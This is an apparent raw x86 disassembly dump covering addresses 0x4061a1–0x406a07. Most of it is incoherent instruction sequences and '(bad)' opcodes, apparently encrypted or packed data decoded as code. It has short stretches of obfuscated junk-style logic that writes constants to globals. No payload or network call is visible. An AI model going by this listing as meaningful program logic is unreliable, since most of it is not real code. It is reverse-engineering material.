  4061a1:	into   
  4061a2:	sub    esi,DWORD PTR [eax]
  4061a4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4061a5:	rcl    BYTE PTR [eax-0x7c432dcd],cl
  4061ab:	into   
  4061ac:	xchg   BYTE PTR [esi+0x378b43ba],ah
  4061b2:	jecxz  0x406229
  4061b4:	jg     0x4061c9
  4061b6:	pop    ss
  4061b7:	push   es
  4061b8:	inc    ecx
  4061b9:	adc    DWORD PTR [edx-0x2faa79d],ecx
  4061bf:	cld    
  4061c0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4061c1:	jns    0x406228
  4061c3:	inc    ebx
  4061c4:	mov    ah,0x8a
  4061c6:	xor    bh,BYTE PTR [ecx]
  4061c8:	inc    ecx
  4061c9:	lods   al,BYTE PTR ds:[esi]
  4061ca:	mov    ebp,0x6a3d2abe
  4061cf:	mov    dh,0x20
  4061d1:	mov    al,0x38
  4061d3:	rol    DWORD PTR [edi],cl
  4061d5:	sub    bl,BYTE PTR [eax]
  4061d7:	popa   
  4061d8:	(bad)  
  4061d9:	dec    esi
  4061da:	push   ebp
  4061db:	aad    0xa2
  4061dd:	ja     0x406257
  4061df:	imul   eax,DWORD PTR [ebx],0xc9b35dbf
  4061e5:	dec    edi
  4061e6:	test   ch,bh
  4061e8:	pop    ss
  4061e9:	stos   DWORD PTR es:[edi],eax
  4061ea:	hlt    
  4061eb:	push   0x61
  4061ed:	idiv   BYTE PTR [edx+0x22]
  4061f0:	aam    0x2e
  4061f2:	mov    BYTE PTR [ecx-0x353e627c],dl
  4061f8:	out    0x48,eax
  4061fa:	xchg   ecx,eax
  4061fb:	pop    ss
  4061fc:	imul   DWORD PTR [ecx-0x1c2fc6bf]
  406202:	mov    edx,0x4c67e93a
  406207:	sub    ax,0x9277
  40620b:	bound  esp,QWORD PTR [esi-0x6156addb]
  406211:	jo     0x406226
  406213:	inc    esp
  406214:	adc    BYTE PTR [edi+0x44],dl
  406217:	sub    BYTE PTR [ebp-0x6d70ebf0],bh
  40621d:	or     BYTE PTR [edi],0x1
  406220:	iret   
  406221:	or     DWORD PTR [edx-0x37a6bbc9],0x45
  406228:	mov    ebx,0x5b7fd6c2
  40622d:	cmp    BYTE PTR [edi+0x59],al
  406230:	std    
  406231:	pop    DWORD PTR [eax]
  406233:	mov    esp,0xd077994c
  406238:	sbb    BYTE PTR [ebx+ecx*1],cl
  40623b:	je     0x406216
  40623d:	je     0x4061dc
  40623f:	cwde   
  406240:	and    BYTE PTR [ebx+0x78],ah
  406243:	jne    0x40628b
  406245:	sti    
  406246:	aad    0xea
  406248:	jmp    0xff9e:0xe47be1b4
  40624f:	inc    ecx
  406250:	out    dx,eax
  406251:	rol    BYTE PTR cs:[edx-0x52e1dcab],1
  406258:	outs   dx,DWORD PTR ds:[esi]
  406259:	pop    ss
  40625a:	xchg   dl,bl
  40625c:	fdiv   DWORD PTR ds:0x9df3af0a
  406262:	sar    DWORD PTR [edx-0x296e6b9f],cl
  406268:	jmp    0x416222df
  40626d:	lods   al,BYTE PTR ds:[esi]
  40626e:	fild   DWORD PTR [edx-0x71]
  406271:	hlt    
  406272:	xchg   edx,eax
  406273:	gs or  al,0xbe
  406276:	sbb    DWORD PTR ds:0x7a03ce5b,eax
  40627c:	xchg   esi,eax
  40627d:	stc    
  40627e:	fwait
  40627f:	or     eax,0x88458520
  406284:	dec    edi
  406285:	shr    ecx,cl
  406287:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406288:	sbb    ebx,edi
  40628a:	mov    dl,bl
  40628c:	imul   ebx,DWORD PTR [edi],0xffffffe5
  40628f:	mov    eax,ds:0xa397ccd6
  406294:	call   0xfc5a0cc1
  406299:	inc    ebp
  40629a:	imul   eax,DWORD PTR [edx],0xcfd7e98b
  4062a0:	dec    esp
  4062a1:	mov    ch,0xd9
  4062a3:	adc    BYTE PTR [ebp+esi*1-0x732554f7],dl
  4062aa:	push   ds
  4062ab:	add    al,0x9e
  4062ad:	test   al,0x1
  4062af:	call   0x7e9:0xeea8863e
  4062b6:	popa   
  4062b7:	pop    eax
  4062b8:	in     al,0x4
  4062ba:	fs push 0xf83df7e6
  4062c0:	rol    ah,0xf3
  4062c3:	aad    0x62
  4062c5:	(bad)  
  4062c6:	in     al,0x29
  4062c8:	cmp    BYTE PTR [ebp-0x7d],dl
  4062cb:	leave  
  4062cc:	jbe    0x4062a9
  4062ce:	sahf   
  4062cf:	into   
  4062d0:	aam    0xb1
  4062d2:	adc    eax,0xb0fa2754
  4062d7:	add    ch,al
  4062d9:	lds    eax,FWORD PTR [edi-0x71]
  4062dc:	xchg   edx,eax
  4062dd:	or     al,0x21
  4062df:	es mov eax,cs
  4062e2:	xchg   edx,eax
  4062e3:	inc    ebx
  4062e4:	mov    ecx,DWORD PTR [ebx-0x9]
  4062e7:	(bad)  
  4062ea:	adc    bh,BYTE PTR ds:0xb13d59d9
  4062f0:	ss pushf 
  4062f2:	dec    edx
  4062f3:	xor    DWORD PTR [ebx+0x30c0369],esi
  4062f9:	(bad)  [esi-0x3419e390]
  4062ff:	and    ebp,DWORD PTR [ecx]
  406301:	stos   DWORD PTR es:[edi],eax
  406302:	std    
  406303:	jns    0x4062e4
  406305:	cmp    al,0xd2
  406307:	leave  
  406308:	push   DWORD PTR [esi]
  40630a:	(bad)  
  40630b:	mov    WORD PTR [esi+edx*4+0x4a],gs
  40630f:	fsub   st,st(5)
  406311:	and    DWORD PTR [esi],edx
  406313:	pop    esp
  406314:	dec    edx
  406315:	je     0x4062ea
  406317:	inc    esi
  406318:	out    dx,eax
  406319:	enter  0x270b,0x6d
  40631d:	add    dl,BYTE PTR [ebp-0x47]
  406320:	mov    edx,0x97c394ba
  406325:	inc    esi
  406326:	mov    ds,WORD PTR [edi-0x56]
  406329:	xor    edi,ecx
  40632b:	inc    ebx
  40632c:	sub    eax,0xbf243285
  406331:	not    DWORD PTR [ecx-0x17f593a]
  406337:	dec    esi
  406338:	push   0xffffffef
  40633a:	leave  
  40633b:	les    esi,FWORD PTR [eax+ebp*2]
  40633e:	sub    dh,ah
  406340:	call   0x2e30:0xc1f0a4ab
  406347:	outs   dx,BYTE PTR ds:[esi]
  406348:	sbb    DWORD PTR [ebp+0x42],ebx
  40634b:	ss mov dl,al
  40634e:	add    DWORD PTR [ecx+0x64],esp
  406351:	push   0xd596b90
  406356:	pushf  
  406357:	inc    eax
  406358:	and    BYTE PTR [ecx-0x69b8fbf0],ch
  40635e:	and    dh,BYTE PTR [edx]
  406360:	mov    edi,0x497bb083
  406365:	or     BYTE PTR [edi+0x66],0x52
  406369:	mov    bh,0x3c
  40636b:	jp     0x4063c5
  40636d:	fs pusha 
  40636f:	pop    esp
  406370:	dec    ebp
  406371:	dec    ecx
  406372:	sub    eax,0xb243556b
  406377:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406378:	jg     0x40636d
  40637a:	popf   
  40637b:	sahf   
  40637c:	add    bh,BYTE PTR gs:[esi-0x1aa068e4]
  406383:	jnp    0x406332
  406385:	cmp    ecx,DWORD PTR [edi-0x3b96389d]
  40638b:	sub    al,0x70
  40638d:	ins    BYTE PTR es:[edi],dx
  40638e:	fs push ecx
  406390:	call   0xbfc4:0x56c1332d
  406397:	lods   eax,DWORD PTR ds:[esi]
  406398:	cwde   
  406399:	sbb    eax,0xb266d549
  40639e:	pop    ds
  40639f:	in     al,0xe8
  4063a1:	rol    BYTE PTR [ecx-0x3ecd563a],1
  4063a7:	push   esi
  4063a8:	mov    bh,0x78
  4063aa:	clc    
  4063ab:	stos   DWORD PTR es:[edi],eax
  4063ac:	jge    0x40636e
  4063ae:	bound  ebx,QWORD PTR [eax+0x73d91e72]
  4063b4:	push   esi
  4063b5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4063b6:	mov    edx,0x837f6e50
  4063bb:	add    BYTE PTR [esi],ah
  4063bd:	cmp    BYTE PTR [esi],ah
  4063bf:	mov    ecx,DWORD PTR [edx+0x28]
  4063c2:	or     ah,BYTE PTR [ecx+0x49]
  4063c5:	ins    BYTE PTR es:[edi],dx
  4063c6:	sub    BYTE PTR [esp+esi*8+0x0],al
  4063ca:	push   ebx
  4063cb:	sbb    dh,dh
  4063cd:	jb     0x4063d8
  4063cf:	(bad)  
  4063d0:	mov    al,ds:0xc95965f2
  4063d5:	gs ins BYTE PTR es:[edi],dx
  4063d7:	mov    cl,0xdc
  4063d9:	or     eax,0xfb6ad4bb
  4063de:	jecxz  0x406437
  4063e0:	xchg   esi,eax
  4063e1:	mov    ds:0x8f9dd4f0,eax
  4063e6:	ffreep st(1)
  4063e8:	mov    al,0x14
  4063ea:	sbb    al,0xd6
  4063ec:	out    dx,al
  4063ed:	and    DWORD PTR fs:[ecx+0x5ca797f5],ecx
  4063f4:	cwde   
  4063f5:	and    BYTE PTR [ebp+0x57],0x5b
  4063f9:	retf   0x1582
  4063fc:	jmp    0x7a1a033e
  406401:	cmp    al,0x43
  406403:	jno    0x4063bb
  406405:	sub    eax,0x8ed32a88
  40640a:	mov    bh,BYTE PTR [ebx]
  40640c:	test   eax,0xc80b4863
  406411:	lahf   
  406412:	sub    ecx,ebx
  406414:	adc    al,cl
  406416:	inc    ecx
  406417:	or     eax,0xcaa9b3f0
  40641c:	mov    esp,DWORD PTR [edx-0x51]
  40641f:	daa    
  406420:	adc    ecx,DWORD PTR [edi]
  406422:	xchg   bh,bh
  406424:	idiv   edi
  406426:	call   FWORD PTR [ebx-0x48]
  406429:	xor    al,BYTE PTR [ebp+0x5e5ff89c]
  40642f:	leave  
  406430:	ret    0xc
  406433:	push   ebp
  406434:	mov    ebp,esp
  406436:	mov    eax,ds:0x41222c
  40643b:	add    DWORD PTR ds:0x430606,edi
  406441:	mov    edx,0x32729d
  406446:	xor    ecx,DWORD PTR ds:0x42e8e2
  40644c:	sub    eax,edx
  40644e:	inc    DWORD PTR ds:0x430612
  406454:	mov    ecx,0x7510856
  406459:	push   esi
  40645a:	sbb    DWORD PTR ds:0x430632,0x57eb
  406464:	mov    esi,DWORD PTR [ebp+0xc]
  406467:	xor    eax,ecx
  406469:	mov    DWORD PTR ds:0x42ef8c,0x533d
  406473:	cmp    eax,esi
  406475:	mov    DWORD PTR ds:0x42e8e2,0x3465
  40647f:	je     0x406fac
  406485:	mov    eax,ds:0x412224
  40648a:	dec    DWORD PTR ds:0x42e8da
  406490:	jmp    0x40681a
  406495:	fcmovnb st,st(7)
  406497:	dec    esi
  406498:	fild   WORD PTR [edx+0x57]
  40649b:	jnp    0x406498
  40649d:	(bad)  
  40649e:	cmp    ebx,DWORD PTR [esi*8+0x1a803c21]
  4064a5:	fidiv  WORD PTR [ebx]
  4064a7:	jle    0x406527
  4064a9:	jmp    0x40651c
  4064ab:	jle    0x40652b
  4064ad:	sub    BYTE PTR [edx+edx*8+0x78],dl
  4064b1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4064b2:	sahf   
  4064b3:	ins    DWORD PTR es:[edi],dx
  4064b4:	add    eax,0x7a996f8c
  4064b9:	(bad)  
  4064ba:	out    0xad,al
  4064bc:	leave  
  4064bd:	retf   0xdfd1
  4064c0:	pop    ds
  4064c1:	add    eax,0x91339578
  4064c6:	adc    al,0x6
  4064c8:	and    DWORD PTR [ebx+0x54],esi
  4064cb:	shl    BYTE PTR [ebx+0x4277e94f],cl
  4064d1:	shl    DWORD PTR [ebx],1
  4064d3:	add    BYTE PTR [eax],0xb2
  4064d6:	js     0x40650d
  4064d8:	sub    ecx,edx
  4064da:	test   ch,dl
  4064dc:	enter  0x8f,0xac
  4064e0:	xchg   edx,eax
  4064e1:	fidiv  WORD PTR [ebx+0xa26ca7f]
  4064e7:	push   eax
  4064e8:	sub    al,0x29
  4064ea:	pushf  
  4064eb:	add    eax,0x3746a0e1
  4064f0:	in     al,dx
  4064f1:	inc    esi
  4064f2:	sub    DWORD PTR [ecx+0x7a],eax
  4064f5:	mov    edx,0x5b60d240
  4064fa:	idiv   BYTE PTR [ebp+esi*2-0x142f281f]
  406501:	fdivr  QWORD PTR [esi-0x7d]
  406504:	sbb    ch,BYTE PTR [ebp+0x46cf7a7]
  40650a:	js     0x40648c
  40650c:	mov    esi,0xee7c8feb
  406511:	adc    esi,DWORD PTR [edi+0x4e4717f6]
  406517:	rol    DWORD PTR [eax],cl
  406519:	push   edi
  40651a:	mov    cl,0xd8
  40651c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40651d:	adc    bl,BYTE PTR [edx-0x14]
  406520:	(bad)  
  406521:	int    0xcf
  406523:	addr16 fs addr16 xor al,0x46
  406528:	lahf   
  406529:	rol    eax,cl
  40652b:	cld    
  40652c:	sbb    edi,DWORD PTR [edx+0x4ebd9649]
  406532:	mov    edi,0x7ccd83d5
  406537:	es (bad) 
  406539:	fucomp st(1)
  40653b:	adc    DWORD PTR [ebx],ebp
  40653d:	iret   
  40653e:	inc    ebx
  40653f:	mov    edx,ecx
  406541:	iret   
  406542:	fnstcw WORD PTR [edx]
  406544:	xchg   esp,eax
  406545:	mov    dh,0xf4
  406547:	jp     0x406506
  406549:	out    dx,al
  40654a:	adc    ebp,DWORD PTR [eax-0x60]
  40654d:	inc    DWORD PTR [eax+0x27]
  406550:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406551:	lock mov eax,0xebb962cb
  406557:	stos   BYTE PTR es:[edi],al
  406558:	xor    BYTE PTR [esi],dl
  40655a:	jae    0x406501
  40655c:	sub    eax,0xd5933593
  406561:	retf   
  406562:	outs   dx,DWORD PTR ds:[esi]
  406563:	sahf   
  406564:	out    dx,eax
  406565:	sbb    dl,BYTE PTR [ecx-0x6075cb54]
  40656b:	xchg   esi,eax
  40656c:	sahf   
  40656d:	call   0xc1b0:0xf56a0d2b
  406574:	xchg   ebp,eax
  406575:	test   eax,0x1b67855b
  40657a:	fisttp DWORD PTR [ebx+0x5d]
  40657d:	and    ebx,DWORD PTR [edx+0x55b744ac]
  406583:	std    
  406584:	popa   
  406585:	xchg   dl,bh
  406587:	inc    edi
  406588:	push   eax
  406589:	outs   dx,BYTE PTR ds:[esi]
  40658a:	(bad)
  40658d:	mov    edi,0xe70bd806
  406592:	ror    DWORD PTR [edi+0x46],0x43
  406596:	call   0x2c52d1b0
  40659b:	mov    ah,0xa4
  40659d:	fdiv   DWORD PTR [edx-0x3b]
  4065a0:	popa   
  4065a1:	xor    edx,edi
  4065a3:	jl     0x40661d
  4065a5:	cwde   
  4065a6:	cmp    BYTE PTR [eax-0x240901a6],0xb3
  4065ad:	adc    al,0xdb
  4065af:	dec    eax
  4065b0:	xor    bh,BYTE PTR [edx-0x13]
  4065b3:	cmp    ah,BYTE PTR [edi-0x57]
  4065b6:	mov    ah,0xdc
  4065b8:	les    esp,FWORD PTR [ebx+0x78]
  4065bb:	ins    DWORD PTR es:[edi],dx
  4065bc:	loop   0x406587
  4065be:	rcr    al,0x9b
  4065c1:	(bad)  
  4065c2:	mov    edx,0xa64fb6a8
  4065c7:	imul   edx,DWORD PTR [edi+0x2082ec7b],0x16c72d20
  4065d1:	xchg   DWORD PTR [ebx-0x1b],edx
  4065d4:	sub    edi,ebx
  4065d6:	test   eax,0xf6f436e9
  4065db:	cli    
  4065dc:	and    BYTE PTR [ebx+0x1e25e762],ah
  4065e2:	cli    
  4065e3:	stos   DWORD PTR es:[edi],eax
  4065e4:	jp     0x406596
  4065e6:	cmp    ebp,DWORD PTR [eax]
  4065e8:	test   BYTE PTR [ecx-0xcf5bb3c],cl
  4065ee:	pop    esp
  4065ef:	in     eax,0xd9
  4065f1:	jo     0x4065f7
  4065f3:	out    dx,al
  4065f4:	jno    0x40665c
  4065f6:	pusha  
  4065f7:	mov    al,ds:0x871a359d
  4065fc:	push   edx
  4065fd:	pop    ebx
  4065fe:	pop    es
  4065ff:	cwde   
  406600:	and    al,0xaa
  406602:	push   cs
  406603:	(bad)  
  406604:	xchg   esp,eax
  406605:	mov    ch,0x65
  406607:	cld    
  406608:	jno    0x406604
  40660a:	or     eax,0x7739416e
  40660f:	ret    
  406610:	xor    BYTE PTR [edx],dl
  406612:	test   BYTE PTR [ebx+0x283fc5d],al
  406618:	mov    cs,WORD PTR [edx]
  40661a:	test   DWORD PTR [ebp+esi*2-0xf],esp
  40661e:	pop    edi
  40661f:	jae    0x4065ce
  406621:	jmp    0xb039464f
  406626:	and    al,0xe4
  406628:	push   esi
  406629:	push   eax
  40662a:	sub    al,BYTE PTR [ebp+0x2b589318]
  406630:	loop   0x40667b
  406632:	(bad)  
  406633:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406634:	test   DWORD PTR [ebx+0x17],eax
  406637:	mov    ebx,0xab07fc7b
  40663c:	retf   0x4a48
  40663f:	add    DWORD PTR [ebx+0x47],edi
  406642:	ss je  0x4065e1
  406645:	pop    ebx
  406646:	fisttp WORD PTR [ecx+0x7a6f42ef]
  40664c:	or     ax,WORD PTR [eax*1-0x7364923e]
  406654:	push   ebp
  406655:	push   edx
  406656:	pushf  
  406657:	arpl   WORD PTR [ebx+0x284b09bd],di
  40665d:	bound  esp,QWORD PTR [esi-0x19]
  406660:	pop    ebx
  406661:	cmp    BYTE PTR [esi-0x49],0xf
  406665:	sbb    eax,0x56f4207e
  40666a:	cwde   
  40666b:	inc    esi
  40666c:	enter  0x780a,0x9c
  406670:	fcomi  st,st(0)
  406672:	int3   
  406673:	bound  edi,QWORD PTR [ecx-0x6d338f1]
  406679:	and    edx,DWORD PTR [eax+esi*1]
  40667c:	cmp    al,0x62
  40667e:	and    al,0xdc
  406680:	push   esp
  406681:	pusha  
  406682:	aam    0xcd
  406684:	xchg   esi,eax
  406685:	pop    eax
  406686:	out    dx,eax
  406687:	loope  0x40665e
  406689:	or     al,cl
  40668b:	cmp    ah,BYTE PTR [ebp+0x620ef003]
  406691:	cmp    DWORD PTR [edi-0x405af312],edx
  406697:	cld    
  406698:	lock bound esp,QWORD PTR [edi]
  40669b:	outs   dx,BYTE PTR ds:[esi]
  40669c:	inc    ebx
  40669d:	lods   al,BYTE PTR ds:[esi]
  40669e:	mov    es,edi
  4066a0:	fwait
  4066a1:	mov    ds:0x8d491874,eax
  4066a6:	ds inc edi
  4066a8:	mov    ch,0xd6
  4066aa:	jo     0x406701
  4066ac:	push   esp
  4066ad:	mov    esp,0x3a29bfe6
  4066b2:	repz lahf 
  4066b4:	test   al,0xc5
  4066b6:	popf   
  4066b7:	iret   
  4066b8:	or     BYTE PTR [ecx-0x3f4a8666],ah
  4066be:	imul   edx,DWORD PTR [esi-0x2c3040d2],0xa882ba04
  4066c8:	hlt    
  4066c9:	je     0x40673a
  4066cb:	inc    esi
  4066cc:	not    DWORD PTR [ebx]
  4066ce:	mov    ds:0xe89085ea,eax
  4066d3:	dec    esp
  4066d4:	or     al,0x16
  4066d6:	(bad)  
  4066d8:	fcom   DWORD PTR [eax+edx*4]
  4066db:	lock and BYTE PTR [ecx],bl
  4066de:	stc    
  4066df:	jmp    0x40669c
  4066e1:	icebp  
  4066e2:	aas    
  4066e3:	in     al,0x4d
  4066e5:	das    
  4066e6:	mov    ebx,0x7035f47e
  4066eb:	add    eax,0x9b72e272
  4066f0:	ss push esi
  4066f2:	sub    eax,edi
  4066f4:	ins    BYTE PTR es:[edi],dx
  4066f5:	sti    
  4066f6:	pop    es
  4066f7:	pop    es
  4066f8:	or     al,0x34
  4066fa:	pop    esp
  4066fb:	popf   
  4066fc:	adc    BYTE PTR [edx+0x18121d36],dl
  406702:	push   cs
  406703:	ins    DWORD PTR es:[edi],dx
  406704:	push   ecx
  406705:	sub    DWORD PTR [edi],eax
  406707:	xchg   BYTE PTR [edx+0x61da1880],bl
  40670d:	and    al,BYTE PTR [ebx+0x52]
  406710:	adc    edx,DWORD PTR [edx-0x1087929c]
  406716:	xchg   esi,eax
  406717:	or     DWORD PTR [ebp+0xdb8bcb8],0xffffff80
  40671e:	or     al,0x8c
  406720:	daa    
  406721:	loopne 0x40670c
  406723:	cli    
  406724:	shl    DWORD PTR [ecx-0x2f],0xa2
  406728:	push   ebp
  406729:	retf   0x90b2
  40672c:	jg     0x4066eb
  40672e:	sbb    BYTE PTR [edx+0x5f],0x24
  406732:	jle    0x4066f0
  406734:	add    al,0x53
  406736:	cmp    eax,0xee52d677
  40673b:	fidiv  WORD PTR [esi]
  40673d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40673e:	adc    dl,BYTE PTR [ebx-0x74a3a677]
  406744:	ja     0x4066de
  406746:	mov    cl,0xfc
  406748:	shr    DWORD PTR [edi],1
  40674a:	leave  
  40674b:	dec    ebp
  40674c:	(bad)  
  40674d:	pop    edi
  40674e:	lds    edi,FWORD PTR [eax-0x7a2c92cc]
  406754:	mov    al,ds:0x34730d59
  406759:	popa   
  40675a:	dec    ebp
  40675b:	cmp    bl,0xa
  40675e:	ins    BYTE PTR es:[edi],dx
  40675f:	adc    ebx,DWORD PTR [eax]
  406761:	cmp    bh,al
  406763:	bound  esi,QWORD PTR [ebp+0x22e350cc]
  406769:	call   0xb869:0x8ddd2bbe
  406770:	inc    ebp
  406771:	retf   
  406772:	dec    ebx
  406773:	(bad)  
  406775:	push   edx
  406776:	push   cs
  406777:	sub    dh,dl
  406779:	mov    bh,0x21
  40677b:	or     BYTE PTR [ecx-0x3f],dh
  40677e:	sbb    BYTE PTR [esi-0x4e4e0727],bh
  406784:	pop    ds
  406785:	out    dx,al
  406786:	push   eax
  406787:	daa    
  406788:	daa    
  406789:	mov    eax,0x90e88fa5
  40678e:	sbb    ah,BYTE PTR [eax-0x43e53b58]
  406794:	ja     0x4067e4
  406796:	push   0xd0ee6f9e
  40679b:	(bad)  
  40679c:	mov    edi,0x65ed332c
  4067a1:	add    DWORD PTR [ecx+edi*8-0x58618e9c],esp
  4067a8:	loop   0x4067a5
  4067aa:	push   edi
  4067ab:	jnp    0x406756
  4067ad:	mov    eax,0x277496a
  4067b2:	mov    ah,0x6f
  4067b4:	cdq    
  4067b5:	mov    edx,0x3262adab
  4067ba:	ret    
  4067bb:	sbb    al,0xac
  4067bd:	(bad)  
  4067be:	aas    
  4067bf:	mov    ebx,0x59599c1b
  4067c4:	inc    esp
  4067c5:	lds    ebx,FWORD PTR [esi]
  4067c7:	mov    ds:0xb4ebbd72,eax
  4067cc:	repz bound ecx,QWORD PTR [edi+0x48]
  4067d0:	(bad)  
  4067d2:	mov    esp,0xfb445b38
  4067d7:	mov    esp,0xa7ac9b5d
  4067dc:	ss aad 0x90
  4067df:	or     eax,0xcb86def6
  4067e4:	mov    ebx,0x4e05a3d1
  4067e9:	cld    
  4067ea:	or     DWORD PTR [ecx+0x78],edi
  4067ed:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4067ee:	inc    ecx
  4067ef:	in     al,0x51
  4067f1:	je     0x40683a
  4067f3:	jg     0x4067ca
  4067f5:	dec    ecx
  4067f6:	cmp    ah,dh
  4067f8:	inc    esi
  4067f9:	and    BYTE PTR [edx+0x259e5c40],ah
  4067ff:	mov    ebx,0xfa87262f
  406804:	rcr    DWORD PTR [eax],0xe6
  406807:	pop    esi
  406808:	xchg   DWORD PTR [ebx+0x41],edx
  40680b:	mov    cs,WORD PTR [edi+0x2d]
  40680e:	mov    ch,0x9d
  406810:	xor    eax,0x446f6420
  406815:	frstor es:[edi+ebx*2-0x52]
  40681a:	mov    esi,DWORD PTR [ebp+0xc]
  40681d:	sbb    DWORD PTR ds:0x42efa4,0x43062a
  406827:	sub    eax,edx
  406829:	xor    eax,ecx
  40682b:	mov    DWORD PTR ds:0x4306d2,0x4727
  406835:	cmp    eax,esi
  406837:	mov    DWORD PTR ds:0x42ef9c,0x846
  406841:	jne    0x406867
  406847:	add    eax,DWORD PTR ds:0x4306be
  40684d:	mov    eax,ds:0x41222c
  406852:	add    eax,DWORD PTR ds:0x412224
  406858:	mov    DWORD PTR ds:0x43063a,0x6a19
  406862:	jmp    0x406878
  406867:	mov    eax,DWORD PTR [ebp+0xc]
  40686a:	xor    DWORD PTR ds:0x4306d6,0x43061a
  406874:	xor    eax,ecx
  406876:	add    eax,edx
  406878:	mov    DWORD PTR ds:0x42efa4,0x1bc3
  406882:	jmp    0x406c0c
  406887:	xchg   BYTE PTR [ecx],dh
  406889:	fcmove st,st(5)
  40688b:	pop    ebp
  40688c:	fstp   QWORD PTR [ecx-0x3833e0bb]
  406892:	dec    esi
  406893:	ja     0x406908
  406895:	(bad)  
  406896:	mov    esp,0x7e7e364b
  40689b:	jmp    0x40690e
  40689d:	jle    0x40691d
  40689f:	aad    0xca
  4068a1:	rcr    dh,1
  4068a3:	adc    BYTE PTR [edi],bl
  4068a5:	add    eax,0x302bd7a5
  4068aa:	fwait
  4068ab:	mov    ecx,0x7eb03c6e
  4068b0:	or     edi,DWORD PTR [esi-0x4d298a2f]
  4068b6:	dec    ebx
  4068b7:	sub    eax,0x9e89bef1
  4068bc:	and    dh,BYTE PTR [eax]
  4068be:	aam    0xd2
  4068c0:	add    DWORD PTR [edi+0x5],0xeb36e024
  4068c7:	loopne 0x406911
  4068c9:	jl     0x40688d
  4068cb:	xchg   DWORD PTR [edi+0x78],esp
  4068ce:	call   0xf4c5cfeb
  4068d3:	test   DWORD PTR [ebp-0xd488cf2],edi
  4068d9:	dec    edi
  4068da:	pop    edx
  4068db:	jg     0x4068cd
  4068dd:	jo     0x4068a2
  4068df:	fisttp WORD PTR [ebp+0x7a9b458c]
  4068e5:	add    ah,ch
  4068e7:	xor    al,0x3a
  4068e9:	xor    al,0x18
  4068eb:	mov    ebp,0x64c56a40
  4068f0:	jl     0x406886
  4068f2:	inc    edx
  4068f3:	xchg   ecx,eax
  4068f4:	loop   0x406973
  4068f6:	aaa    
  4068f7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4068f8:	in     al,0xd4
  4068fa:	add    dh,0xb6
  4068fd:	xor    edx,DWORD PTR [ebp+ecx*1-0x1d80111f]
  406904:	xor    ah,0x86
  406907:	mov    eax,ds:0x7331b078
  40690c:	imul   ecx,DWORD PTR [eax],0x6e
  40690f:	adc    eax,DWORD PTR [ecx-0x61a13cc4]
  406915:	xlat   BYTE PTR ds:[ebx]
  406916:	in     al,0xa6
  406918:	cld    
  406919:	js     0x40693d
  40691b:	out    0x9d,eax
  40691d:	mov    esp,DWORD PTR [eax]
  40691f:	jg     0x4068cc
  406921:	in     al,0x30
  406923:	fcom   DWORD PTR [edx]
  406925:	outs   dx,DWORD PTR ds:[esi]
  406926:	imul   edx,DWORD PTR [edx+0x41441172],0x7a
  40692d:	arpl   bp,bx
  40692f:	bound  esi,QWORD PTR [ecx-0x2a86e04f]
  406935:	out    0xe9,al
  406937:	xor    edx,DWORD PTR [ebx]
  406939:	and    eax,0xc41c7553
  40693e:	lock xor esp,DWORD PTR [edx+ebx*2]
  406942:	cmp    WORD PTR ds:[ebp-0x58],bp
  406947:	jo     0x40699e
  406949:	xchg   ebx,eax
  40694a:	inc    esp
  40694b:	pop    ebx
  40694c:	ja     0x406963
  40694e:	sub    eax,0x5aeeb3bc
  406953:	dec    eax
  406954:	adc    esp,ebp
  406956:	imul   eax,DWORD PTR [ecx-0x6968145],0x7b
  40695d:	mov    ah,bh
  40695f:	out    dx,al
  406960:	sub    dh,BYTE PTR [ebp-0x52872d6]
  406966:	arpl   WORD PTR [eax-0x1c],di
  406969:	and    bh,al
  40696b:	pop    ds
  40696c:	and    esi,DWORD PTR [esi+0xa]
  40696f:	(bad)  
  406970:	push   cs
  406971:	sahf   
  406972:	jo     0x406976
  406974:	add    BYTE PTR [eax+0x3850574],ah
  40697a:	imul   BYTE PTR [ebp+0x6e4e4377]
  406980:	repz or dl,BYTE PTR [esi+0x39845b66]
  406987:	pop    es
  406988:	scas   al,BYTE PTR es:[edi]
  406989:	lea    ebx,[eax+0x4597149]
  40698f:	add    cl,BYTE PTR [bp+di-0x2a]
  406993:	test   DWORD PTR [esi],0xf246e559
  406999:	dec    ebx
  40699a:	arpl   WORD PTR [eax-0x32368e7d],bx
  4069a0:	gs cmp al,0x59
  4069a3:	push   0xf2c9533f
  4069a8:	ds out dx,al
  4069aa:	sub    ch,BYTE PTR [edx]
  4069ac:	adc    eax,0x77df4ca0
  4069b1:	sbb    ah,cl
  4069b3:	cmp    al,0x60
  4069b5:	mov    eax,0x58211061
  4069ba:	xchg   DWORD PTR [eax],edi
  4069bc:	jg     0x4069a9
  4069be:	(bad)  
  4069bf:	retf   
  4069c0:	cmp    al,0x61
  4069c2:	aam    0xb5
  4069c4:	hlt    
  4069c5:	mov    cl,0x9d
  4069c7:	aas    
  4069c8:	sbb    cl,BYTE PTR [eax+0x58]
  4069cb:	fadd   QWORD PTR [esi]
  4069cd:	lds    edx,FWORD PTR [ebx+eax*1]
  4069d0:	aaa    
  4069d1:	jl     0x406a3f
  4069d3:	or     ah,BYTE PTR [ecx+0x1b]
  4069d6:	inc    ebx
  4069d7:	cmp    BYTE PTR [edx+0x63eac911],al
  4069dd:	dec    ecx
  4069de:	inc    esp
  4069df:	clc    
  4069e0:	(bad)  
  4069e1:	push   esp
  4069e2:	imul   esi,ebp,0x71
  4069e5:	and    DWORD PTR [eax+0x26],esp
  4069e8:	shl    BYTE PTR [ebp+0x75],0x67
  4069ec:	imul   edi,ebx,0x1ba10e5
  4069f2:	imul   ebx,ecx,0x41b85637
  4069f8:	mov    ecx,0x7dbe9807
  4069fd:	idiv   DWORD PTR [edx+edi*4]
  406a00:	dec    DWORD PTR [edx]
  406a02:	and    al,0x75
  406a04:	rcl    DWORD PTR [edi+0x1b],cl
  406a07:	adc    bh,BYTE PTR [ecx+ebx*2]
